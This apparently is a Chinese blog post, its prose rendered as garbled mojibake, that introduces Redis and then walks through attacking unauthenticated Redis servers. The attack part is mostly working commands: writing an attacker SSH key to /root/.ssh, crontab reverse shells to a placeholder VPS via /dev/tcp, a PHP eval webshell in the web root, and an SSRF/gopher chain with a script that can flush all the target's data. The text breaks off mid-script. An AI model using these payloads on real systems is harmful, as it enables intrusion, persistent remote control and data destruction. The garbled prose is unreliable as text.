    <published>2019-05-17T13:49:23.000Z</published>
    <updated>2019-08-11T09:50:18.845Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Redis-ä»‹ç»"><a href="#Redis-ä»‹ç»" class="headerlink" title="Redis ä»‹ç»"></a>Redis ä»‹ç»</h2><h3 id="æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="æ˜¯ä»€ä¹ˆï¼Ÿ"></a>æ˜¯ä»€ä¹ˆï¼Ÿ</h3><p>Redis æ˜¯ä¸€ä¸ªå¼€æºï¼ˆBSDè®¸å¯ï¼‰çš„ï¼Œå†…å­˜ä¸­çš„æ•°æ®ç»“æ„å­˜å‚¨ç³»ç»Ÿï¼Œå®ƒå¯ä»¥ç”¨ä½œæ•°æ®åº“ã€ç¼“å­˜å’Œæ¶ˆæ¯ä¸­é—´ä»¶ã€‚ å®ƒæ”¯æŒå¤šç§ç±»å‹çš„æ•°æ®ç»“æ„ï¼Œå¦‚ <a href="http://www.redis.cn/topics/data-types-intro.html#strings" target="_blank" rel="noopener">å­—ç¬¦ä¸²ï¼ˆstringsï¼‰</a>ï¼Œ <a href="http://www.redis.cn/topics/data-types-intro.html#hashes" target="_blank" rel="noopener">æ•£åˆ—ï¼ˆhashesï¼‰</a>ï¼Œ <a href="http://www.redis.cn/topics/data-types-intro.html#lists" target="_blank" rel="noopener">åˆ—è¡¨ï¼ˆlistsï¼‰</a>ï¼Œ <a href="http://www.redis.cn/topics/data-types-intro.html#sets" target="_blank" rel="noopener">é›†åˆï¼ˆsetsï¼‰</a>ï¼Œ <a href="http://www.redis.cn/topics/data-types-intro.html#sorted-sets" target="_blank" rel="noopener">æœ‰åºé›†åˆï¼ˆsorted setsï¼‰</a> ä¸èŒƒå›´æŸ¥è¯¢ï¼Œ <a href="http://www.redis.cn/topics/data-types-intro.html#bitmaps" target="_blank" rel="noopener">bitmaps</a>ï¼Œ <a href="http://www.redis.cn/topics/data-types-intro.html#hyperloglogs" target="_blank" rel="noopener">hyperloglogs</a> å’Œ <a href="http://www.redis.cn/commands/geoadd.html" target="_blank" rel="noopener">åœ°ç†ç©ºé—´ï¼ˆgeospatialï¼‰</a> ç´¢å¼•åŠå¾„æŸ¥è¯¢ã€‚ Redis å†…ç½®äº† <a href="http://www.redis.cn/topics/replication.html" target="_blank" rel="noopener">å¤åˆ¶ï¼ˆreplicationï¼‰</a>ï¼Œ<a href="http://www.redis.cn/commands/eval.html" target="_blank" rel="noopener">LUAè„šæœ¬ï¼ˆLua scriptingï¼‰</a>ï¼Œ <a href="http://www.redis.cn/topics/lru-cache.html" target="_blank" rel="noopener">LRUé©±åŠ¨äº‹ä»¶ï¼ˆLRU evictionï¼‰</a>ï¼Œ<a href="http://www.redis.cn/topics/transactions.html" target="_blank" rel="noopener">äº‹åŠ¡ï¼ˆtransactionsï¼‰</a> å’Œä¸åŒçº§åˆ«çš„ <a href="http://www.redis.cn/topics/persistence.html" target="_blank" rel="noopener">ç£ç›˜æŒä¹…åŒ–ï¼ˆpersistenceï¼‰</a>ï¼Œ å¹¶é€šè¿‡ <a href="http://www.redis.cn/topics/sentinel.html" target="_blank" rel="noopener">Rediså“¨å…µï¼ˆSentinelï¼‰</a>å’Œè‡ªåŠ¨ <a href="http://www.redis.cn/topics/cluster-tutorial.html" target="_blank" rel="noopener">åˆ†åŒºï¼ˆClusterï¼‰</a>æä¾›é«˜å¯ç”¨æ€§ï¼ˆhigh availabilityï¼‰ã€‚</p><p><img src="https://ws1.sinaimg.cn/large/de75fd55gy1g35u4fne4fj20ju0jeae1.jpg" alt></p><p>Redis ä¸»è¦å°†æ•°æ®å­˜åœ¨å†…å­˜ä¸­ï¼Œç¼“å­˜ä½œç”¨å®é™…é«˜äºå­˜å‚¨ä½œç”¨ï¼Œéšæ—¶å¯æ‰§è¡Œ <code>save</code> å‘½ä»¤å°†å½“å‰å†…å­˜é‡Œçš„æ•°æ®å­˜å…¥ç¡¬ç›˜ä¸­ã€‚å¦‚æœéœ€è¦æ¢å¤æ•°æ®ï¼Œåªéœ€å°†å¤‡ä»½æ–‡ä»¶ <code>dump.rdb</code> ç§»åŠ¨åˆ° redis å®‰è£…ç›®å½•å¹¶å¯åŠ¨æœåŠ¡å³å¯ã€‚é€šå¸¸çœ‹ï¼Œå°†æ•°æ®æ”¾åœ¨å†…å­˜ä¸­æ˜¯ä¸å®‰å…¨çš„ï¼Œä¸€æ—¦å‘ç”Ÿæ–­ç”µæˆ–è€…æœºå™¨æ•…éšœï¼Œ é‡è¦çš„æ•°æ®å¯èƒ½å°±ä¼šä¸¢å¤±ï¼Œå› æ­¤ Redis æä¾›äº†ä¸¤ç§æŒä¹…åŒ–æ–¹å¼ï¼šRDB å’Œ AOFï¼Œå³å¯ä»¥ç”¨ä¸¤ç§ç­–ç•¥å°†å†…å­˜çš„æ•°æ®ä¿å­˜åˆ°ç¡¬ç›˜ä¸­ï¼Œè¿™æ ·å°±ä¿è¯äº†æ•°æ®çš„å¯æŒä¹…æ€§ã€‚</p><p>è¿˜æœ‰ä¸ªé‡è¦ç‰¹ç‚¹ï¼Œå…¶æ‰€æœ‰æ“ä½œéƒ½æ˜¯åŸå­æ€§çš„ï¼Œè¦ä¹ˆæˆåŠŸæ‰§è¡Œï¼Œè¦ä¹ˆå®Œå…¨ä¸æ‰§è¡Œã€‚</p><h3 id="èƒ½åšä»€ä¹ˆï¼Ÿ"><a href="#èƒ½åšä»€ä¹ˆï¼Ÿ" class="headerlink" title="èƒ½åšä»€ä¹ˆï¼Ÿ"></a>èƒ½åšä»€ä¹ˆï¼Ÿ</h3><ul><li><strong>ç¼“å­˜</strong><br>  ç¼“å­˜æœºåˆ¶å‡ ä¹åœ¨æ‰€æœ‰çš„å¤§å‹ç½‘ç«™éƒ½æœ‰ä½¿ç”¨ï¼Œåˆç†åœ°ä½¿ç”¨ç¼“å­˜ä¸ä»…å¯ä»¥åŠ  å¿«æ•°æ®çš„è®¿é—®é€Ÿåº¦ï¼Œè€Œä¸”èƒ½å¤Ÿæœ‰æ•ˆåœ°é™ä½åç«¯æ•°æ®æºçš„å‹åŠ›ã€‚Redis æä¾›äº†é”®å€¼è¿‡æœŸæ—¶é—´è®¾ç½®ï¼Œå¹¶ä¸”ä¹Ÿæä¾›äº†çµæ´»æ§åˆ¶æœ€å¤§å†…å­˜å’Œå†…å­˜æº¢å‡ºåçš„æ·˜æ±°ç­–ç•¥ã€‚å¯ä»¥è¿™ä¹ˆè¯´ï¼Œä¸€ä¸ªåˆç†çš„ç¼“å­˜è®¾è®¡èƒ½å¤Ÿä¸ºä¸€ä¸ªç½‘ç«™çš„ç¨³å®šä¿é©¾æŠ¤èˆªã€‚</li><li><strong>æ’è¡Œæ¦œç³»ç»Ÿ</strong><br>  æ’è¡Œæ¦œç³»ç»Ÿå‡ ä¹å­˜åœ¨äºæ‰€æœ‰çš„ç½‘ç«™ï¼Œä¾‹å¦‚æŒ‰ç…§çƒ­åº¦æ’åçš„æ’è¡Œæ¦œï¼ŒæŒ‰ç…§å‘å¸ƒæ—¶é—´çš„æ’è¡Œæ¦œï¼ŒæŒ‰ç…§å„ç§å¤æ‚ç»´åº¦è®¡ç®—å‡ºçš„æ’è¡Œæ¦œï¼ŒRedis æä¾›äº†åˆ—è¡¨å’Œæœ‰åºé›†åˆæ•°æ®ç»“æ„ï¼Œåˆç†åœ°ä½¿ç”¨è¿™äº›æ•°æ®ç»“æ„å¯ä»¥å¾ˆæ–¹ä¾¿åœ°æ„å»ºå„ç§æ’è¡Œæ¦œç³»ç»Ÿã€‚</li><li><strong>è®¡æ•°å™¨åº”ç”¨</strong><br>  è®¡æ•°å™¨åœ¨ç½‘ç«™ä¸­çš„ä½œç”¨è‡³å…³é‡è¦ï¼Œä¾‹å¦‚è§†é¢‘ç½‘ç«™æœ‰æ’­æ”¾æ•°ã€ç”µå•†ç½‘ç«™æœ‰ æµè§ˆæ•°ï¼Œä¸ºäº†ä¿è¯æ•°æ®çš„å®æ—¶æ€§ï¼Œæ¯ä¸€æ¬¡æ’­æ”¾å’Œæµè§ˆéƒ½è¦åšåŠ  1 çš„æ“ä½œï¼Œå¦‚æœå¹¶å‘é‡å¾ˆå¤§å¯¹äºä¼ ç»Ÿå…³ç³»å‹æ•°æ®çš„æ€§èƒ½æ˜¯ä¸€ç§æŒ‘æˆ˜ã€‚Redis å¤©ç„¶æ”¯æŒè®¡æ•°åŠŸèƒ½è€Œä¸”è®¡æ•°çš„æ€§èƒ½ä¹Ÿéå¸¸å¥½ï¼Œå¯ä»¥è¯´æ˜¯è®¡æ•°å™¨ç³»ç»Ÿçš„é‡è¦é€‰æ‹©ã€‚</li><li><strong>ç¤¾äº¤ç½‘ç»œ</strong><br>  èµ/è¸©ã€ç²‰ä¸ã€å…±åŒå¥½å‹/å–œå¥½ã€æ¨é€ã€ä¸‹æ‹‰åˆ·æ–°ç­‰æ˜¯ç¤¾äº¤ç½‘ç«™çš„å¿…å¤‡åŠŸèƒ½ï¼Œç”±äºç¤¾äº¤ç½‘ç«™è®¿é—®é‡é€šå¸¸æ¯”è¾ƒå¤§ï¼Œè€Œä¸”ä¼ ç»Ÿçš„å…³ç³»å‹æ•°æ®ä¸å¤ªé€‚åˆä¿å­˜è¿™ç§ç±»å‹çš„æ•°æ®ï¼ŒRedisæä¾›çš„æ•°æ®ç»“æ„å¯ä»¥ç›¸å¯¹æ¯”è¾ƒå®¹æ˜“åœ°å®ç°è¿™äº›åŠŸ<br>  èƒ½ã€‚</li><li><strong>æ¶ˆæ¯é˜Ÿåˆ—ç³»ç»Ÿ</strong><br>  æ¶ˆæ¯é˜Ÿåˆ—ç³»ç»Ÿå¯ä»¥è¯´æ˜¯ä¸€ä¸ªå¤§å‹ç½‘ç«™çš„å¿…å¤‡åŸºç¡€ç»„ä»¶ï¼Œå› ä¸ºå…¶å…·æœ‰ä¸šåŠ¡ è§£è€¦ã€éå®æ—¶ä¸šåŠ¡å‰Šå³°ç­‰ç‰¹æ€§ã€‚Redisæä¾›äº†å‘å¸ƒè®¢é˜…åŠŸèƒ½å’Œé˜»å¡é˜Ÿåˆ—çš„åŠŸèƒ½ï¼Œè™½ç„¶å’Œä¸“ä¸šçš„æ¶ˆæ¯é˜Ÿåˆ—æ¯”è¿˜ä¸å¤Ÿè¶³å¤Ÿå¼ºå¤§ï¼Œä½†æ˜¯å¯¹äºä¸€èˆ¬çš„æ¶ˆæ¯é˜Ÿåˆ—åŠŸèƒ½åŸºæœ¬å¯ä»¥æ»¡è¶³ã€‚</li></ul><h3 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h3><p>ä½ å¯ä»¥åœ¨è¿™åšåšå®éªŒ <a href="http://try.redis.io/" target="_blank" rel="noopener">http://try.redis.io/</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> å¯åŠ¨ redis</span></span><br><span class="line"><span class="meta">$</span><span class="bash">redis-server</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> æ‰“å¼€å®¢æˆ·ç«¯ï¼ˆäº¤äº’æ¨¡å¼ï¼‰</span></span><br><span class="line"><span class="meta">$</span><span class="bash">redis-cli</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">ping  <span class="comment"># æµ‹è¯•æ˜¯å¦å¯åŠ¨</span></span></span><br><span class="line">=&gt; pong # åˆ™æˆåŠŸ</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> è¿œç¨‹è¿æ¥</span></span><br><span class="line"><span class="meta">$</span><span class="bash">redis-cli -h host -p port -a password</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line"><span class="meta">$</span><span class="bash">redis-cli -h 127.0.0.1-p 6379 get hello</span></span><br><span class="line">"world"</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">redis-cli -r 3 ping  <span class="comment"># -r å°†å‘½ä»¤é‡å¤æ‰§è¡Œå¤šæ¬¡ï¼Œ[-i 3 åˆ™æ˜¯æ¯ä¸‰ç§’æ‰§è¡Œä¸€æ¬¡å‘½ä»¤]</span></span></span><br><span class="line">PONG</span><br><span class="line">PONG</span><br><span class="line">PONG</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"><span class="built_in">echo</span> <span class="string">"world"</span> |redis-cli -x <span class="built_in">set</span> hello  <span class="comment"># -x ä»æ ‡å‡†è¾“å…¥ä½œä¸ºè¯¥å‘½ä»¤çš„æœ€åä¸€ä¸ªå‚æ•°</span></span></span><br><span class="line">Ok</span><br><span class="line"></span><br><span class="line">info# æä¾›æœåŠ¡å™¨çš„ä¿¡æ¯å’Œç»Ÿè®¡</span><br><span class="line">flushall # åˆ é™¤æ‰€æœ‰æ•°æ®åº“å†…å®¹</span><br><span class="line">flushdb# åˆ·æ–°æ•°æ®åº“</span><br><span class="line">set test "test" # è®¾ç½®å˜é‡</span><br><span class="line">config set dir dirpath # è®¾ç½®è·¯å¾„ç­‰é…ç½®</span><br><span class="line">config get xxx# è·å–åŠ¨æ€é…ç½®ä¿¡æ¯</span><br><span class="line">save # å°†å†…å­˜ä¸­çš„æ•°æ®ä¿å­˜åˆ°ç¡¬ç›˜ä¸­</span><br><span class="line">get var</span><br><span class="line">select 2# é€‰æ‹© 2 å·æ•°æ®åº“ï¼Œé»˜è®¤æœ‰ 16 ä¸ªæ•°æ®åº“</span><br><span class="line">del key  # åˆ é™¤è¿”å› 1</span><br><span class="line">exists key # æ£€æŸ¥ key æ˜¯å¦å­˜åœ¨</span><br><span class="line">expire key seconds # ç»™ key è®¾ç½®è¿‡æœŸæ—¶é—´ï¼ˆç§’ï¼‰</span><br><span class="line">expireat key timestamp# è®¾ç½®è¿‡æœŸæ—¶é—´ï¼ˆæ—¶é—´æˆ³ï¼‰</span><br><span class="line">keys pattern# æŸ¥æ‰¾ç¬¦åˆæ¨¡å¼çš„ keyï¼Œç”¨ ? * æ¨¡ç³ŠåŒ¹é…</span><br><span class="line">move key db# å°†å½“å‰æ•°æ®åº“ key ç§»åŠ¨åˆ°æ•°æ®åº“ db ä¸­</span><br><span class="line">persist key# ç§»é™¤è¿‡æœŸæ—¶é—´ï¼Œkey æŒç»­æœ‰æ•ˆ</span><br><span class="line">pttl key# è¿”å› key å‰©ä½™ç”Ÿå­˜æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰</span><br><span class="line">ttl key # è¿”å› key å‰©ä½™ç”Ÿå­˜æ—¶é—´ï¼ˆç§’ï¼‰</span><br><span class="line">randomkey# éšæœºè¿”å›ä¸€ä¸ª key</span><br><span class="line">rename key newkey# é‡å‘½å</span><br><span class="line">renamex key newkey# ä»…å½“ newkey ä¸å­˜åœ¨æ—¶é‡å‘½å</span><br><span class="line">type key# è·å–ç±»å‹</span><br><span class="line">dump key# åºåˆ—åŒ–</span><br></pre></td></tr></table></figure><h2 id="éæˆæƒè®¿é—®"><a href="#éæˆæƒè®¿é—®" class="headerlink" title="éæˆæƒè®¿é—®"></a>éæˆæƒè®¿é—®</h2><p><strong>ä¸ºä»€ä¹ˆä¼šå‡ºç°éæˆæƒè®¿é—®ï¼Ÿ</strong></p><p>è®¾è®¡å“²å­¦ï¼Ÿä»¥ root æƒé™è¿è¡Œï¼Ÿ</p><blockquote><p> ä»¥ä¸‹åˆ©ç”¨éƒ½æ˜¯åŸºäº redis çš„æŒä¹…åŒ–è¿›è¡Œçš„ä»»æ„æ–‡ä»¶å†™å…¥ï¼Œå…¶ä»–ç©æ³•å¯ä»¥è‡ªå·±å¼€å¼€è„‘æ´ã€‚</p></blockquote><h3 id="å†™å…¬é’¥ç›´æ¥-ssh-è¿æ¥"><a href="#å†™å…¬é’¥ç›´æ¥-ssh-è¿æ¥" class="headerlink" title="å†™å…¬é’¥ç›´æ¥ ssh è¿æ¥"></a>å†™å…¬é’¥ç›´æ¥ ssh è¿æ¥</h3><p>æœ¬åœ°ç”Ÿæˆå…¬ç§é’¥æ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ssh-keygen â€“t rsa</span></span><br></pre></td></tr></table></figure><p>å°†å…¬é’¥å†™å…¥ key.txt æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> (<span class="built_in">echo</span> -e <span class="string">"\n\n"</span>; cat id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">"\n\n"</span>) &gt; key.txt</span></span><br></pre></td></tr></table></figure><p>è¿æ¥ Redis å†™å…¥æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat key.txt | redis-cli -h 127.0.0.1 -x <span class="built_in">set</span> key</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> redis-cli -h 127.0.0.1</span></span><br><span class="line">127.0.0.1:6379&gt; config set dir /root/.ssh/</span><br><span class="line">127.0.0.1:6379&gt; config get dir</span><br><span class="line">1) "dir"</span><br><span class="line">2) "/root/.ssh"</span><br><span class="line">127.0.0.1:6379&gt; config set dbfilename "authorized_keys"</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>ç›´æ¥ç§é’¥è¿æ¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ssh â€“i  id_rsa root@ip</span></span><br></pre></td></tr></table></figure><h3 id="åˆ©ç”¨-crontable-åå¼¹-shell"><a href="#åˆ©ç”¨-crontable-åå¼¹-shell" class="headerlink" title="åˆ©ç”¨ crontable åå¼¹ shell"></a>åˆ©ç”¨ crontable åå¼¹ shell</h3><p>nc ç›‘å¬</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvvp <span class="number">9669</span></span><br></pre></td></tr></table></figure><p>å†™å…¥å®šæ—¶å‘½ä»¤ï¼Œè¿™é‡Œç”¨çš„ <code>bash</code> ï¼Œå…¶ä»–å¼¹æ³•æ”¹ä¸‹è¯­å¥å°±è¡Œã€‚æœ¬åœ° Ubuntu å¼¹å¤±è´¥äº†ï¼Œå†è¯•è¯• py çœ‹çœ‹ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set x "n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/vps_ip/port 0&gt;&amp;1\n\n"</span><br><span class="line">set x "\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/vps_ip/port 0&gt;&amp;1\n\n\n"</span><br><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>ä¸åŒç³»ç»Ÿï¼ˆå‘è¡Œç‰ˆï¼‰çš„å®šæ—¶ä»»åŠ¡æ–‡ä»¶æ‰€åœ¨è·¯å¾„å¯èƒ½ä¸åŒï¼Œä»¥å®é™…ç³»ç»Ÿä¸ºå‡†ã€‚</p><h3 id="å†™-webshell"><a href="#å†™-webshell" class="headerlink" title="å†™ webshell"></a>å†™ webshell</h3><p>å½“æœåŠ¡å™¨å¼€ç€ web æœåŠ¡ï¼Œè€Œä¸” redis æœ‰ web ç›®å½•å†™æƒé™æ—¶ï¼Œå¯ä»¥å°è¯•å†™ webshellã€‚</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">set</span> x <span class="string">"\n\n&lt;?php eval(<span class="variable">$_POST</span>[1]);?&gt;\n"</span></span><br><span class="line">config <span class="builtin-name">set</span> dir /var/www/html</span><br><span class="line">config <span class="builtin-name">set</span> dbfilename shell.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure><h3 id="æ‰§è¡Œå‘½ä»¤ï¼ˆè¿™é‡Œè¿˜å¯ä»¥ç»§ç»­ç ”ç©¶ï¼‰"><a href="#æ‰§è¡Œå‘½ä»¤ï¼ˆè¿™é‡Œè¿˜å¯ä»¥ç»§ç»­ç ”ç©¶ï¼‰" class="headerlink" title="æ‰§è¡Œå‘½ä»¤ï¼ˆè¿™é‡Œè¿˜å¯ä»¥ç»§ç»­ç ”ç©¶ï¼‰"></a>æ‰§è¡Œå‘½ä»¤ï¼ˆè¿™é‡Œè¿˜å¯ä»¥ç»§ç»­ç ”ç©¶ï¼‰</h3><p>æœ¬åœ°å»ºä¸€ä¸ª <code>lua</code> è„šæœ¬ hello.lua</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> msg = <span class="string">"hello,hack!"</span></span><br><span class="line"><span class="keyword">return</span> msg</span><br></pre></td></tr></table></figure><p>redis è¿æ¥å¹¶æ‰§è¡Œ</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis-cli eval <span class="string">"$(cat hello.lua)"</span> <span class="number">0</span> -h <span class="number">192.168</span><span class="number">.152</span><span class="number">.128</span></span><br></pre></td></tr></table></figure><h3 id="æ¢å¤åˆå§‹è®¾ç½®"><a href="#æ¢å¤åˆå§‹è®¾ç½®" class="headerlink" title="æ¢å¤åˆå§‹è®¾ç½®"></a>æ¢å¤åˆå§‹è®¾ç½®</h3><p>ä»¥ä¸‹æ˜¯é»˜è®¤é…ç½®ï¼Œæ›´å¦¥å½“çš„åšæ³•æ˜¯ä½¿ç”¨ <code>config get dir</code> è®°å½•ä¸‹ä¹‹å‰çš„é…ç½®ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> æ¢å¤dir</span></span><br><span class="line">config set dir /var/lib/redis</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> æ¢å¤dbfilename</span></span><br><span class="line">config set dbfilename dump.rdb</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> åˆ·æ–°æ•°æ®åº“</span></span><br><span class="line">flushdb</span><br></pre></td></tr></table></figure><h2 id="ç»“åˆ-ssrf"><a href="#ç»“åˆ-ssrf" class="headerlink" title="ç»“åˆ ssrf"></a>ç»“åˆ ssrf</h2><h3 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h3><p><strong>ä¸ºä»€ä¹ˆè¦ç”¨ gopherï¼Ÿ</strong></p><blockquote><p>Gopher åè®®æ˜¯ HTTP åè®®å‡ºç°ä¹‹å‰ï¼Œåœ¨ Internet ä¸Šå¸¸è§ä¸”å¸¸ç”¨çš„ä¸€ä¸ªåè®®ã€‚å½“ç„¶ç°åœ¨ Gopher åè®®å·²ç»æ…¢æ…¢æ·¡å‡ºå†å²ã€‚ä½†æ˜¯ç»è¿‡éƒ¨åˆ†æµ‹è¯•ï¼Œå‘ç°é˜¿é‡Œäº‘çš„ libcurl è¿˜æ˜¯æ”¯æŒ Gopher åè®®çš„ï¼Œåœ¨å®é™…ç¯å¢ƒä¸­å¯èƒ½ä¼šæœ‰æ›´å¤šã€‚Gopher åè®®å¯ä»¥åšå¾ˆå¤šäº‹æƒ…ï¼Œç‰¹åˆ«æ˜¯åœ¨ SSRF ä¸­å¯ä»¥å‘æŒ¥å¾ˆå¤šé‡è¦çš„ä½œç”¨ã€‚åˆ©ç”¨æ­¤åè®®å¯ä»¥æ”»å‡»å†…ç½‘çš„ FTPã€Telnetã€Redisã€Memcacheï¼Œä¹Ÿå¯ä»¥è¿›è¡Œ GETã€POST è¯·æ±‚ã€‚è¿™æ— ç–‘æå¤§æ‹“å®½äº† SSRF çš„æ”»å‡»é¢ã€‚</p></blockquote><p>åè®®åŸºæœ¬æ ¼å¼ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://<span class="tag">&lt;<span class="name">host</span>&gt;</span>:<span class="tag">&lt;<span class="name">port</span>&gt;</span>/_ + æ•°æ®</span><br></pre></td></tr></table></figure><p>TODOï¼šå•ç‹¬å†™ä¸€ç¯‡æ€»ç»“</p><h3 id="å…·ä½“ç©æ³•"><a href="#å…·ä½“ç©æ³•" class="headerlink" title="å…·ä½“ç©æ³•"></a>å…·ä½“ç©æ³•</h3><p>å†™ä¸€ä¸ªåå¼¹è„šæœ¬ï¼Œæ–¹ä¾¿æŠ“æµé‡ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> flushall  <span class="comment"># æ— æ³•æˆåŠŸæ—¶å†è¯•è¯•è¿™å¥ï¼Œå°†æ¸…æ‰æ‰€æœ‰æ•°æ®</span></span></span><br><span class="line">echo -e "\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/vps_ip/port 0&gt;&amp;1\n\n\n"|redis-cli -h $1 -p $2 -x set 1</span><br><span class="line">redis-cli -h $1 -p $2 config set dir /var/spool/cron/</span><br><span class="line">redis-cli -h $1 -p $2 config set dbfilename root</span><br><span class="line">redis-cli -h $1 -p $2 save</span><br><span class="line">redis-cli -h $1 -p $2 quit</span><br></pre></td></tr></table></figure><p>è¾“å‡ºå››ä¸ª â€œokâ€ å³ä¸ºå†™å…¥æˆåŠŸã€‚</p><p>å…ˆæŠ“ä¸€ä¸‹å®¢æˆ·ç«¯ <code>redis-cli</code> æ‰§è¡Œè¿™äº›å‘½ä»¤æ‰€å‘çš„æ•°æ®åŒ…ï¼Œç„¶åå°è¯•ä¼ªé€ ã€‚</p><p>å¼€ä¸€ä¸ªç«¯å£è½¬å‘ï¼Œä½œä¸ºæ‹¦æˆª</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat -v tcp-listen:2333,fork tcp-connect:localhost:6379</span><br></pre></td></tr></table></figure><blockquote><p>å°† 2333 ç«¯å£çš„æ•°æ®è½¬å‘åˆ° 6379</p></blockquote><p>å°†æ•°æ®æµè½¬æ¢ä¸º <code>gopher</code> å½¢å¼</p><p>è½¬æ¢è§„åˆ™å¦‚ä¸‹ï¼š</p><ul><li>å¦‚æœç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯ &gt; æˆ–è€… &lt; é‚£ä¹ˆä¸¢å¼ƒè¯¥è¡Œå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºè¯·æ±‚å’Œè¿”å›çš„æ—¶é—´ã€‚</li><li>å¦‚æœå‰ 3 ä¸ªå­—ç¬¦æ˜¯ + OK é‚£ä¹ˆä¸¢å¼ƒè¯¥è¡Œå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºè¿”å›çš„å­—ç¬¦ä¸²ã€‚</li><li>å°† \r å­—ç¬¦ä¸²æ›¿æ¢æˆ %0d%0a</li><li>ç©ºç™½è¡Œæ›¿æ¢ä¸º %0a</li></ul><p>ç›´æ¥ä¸Šè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 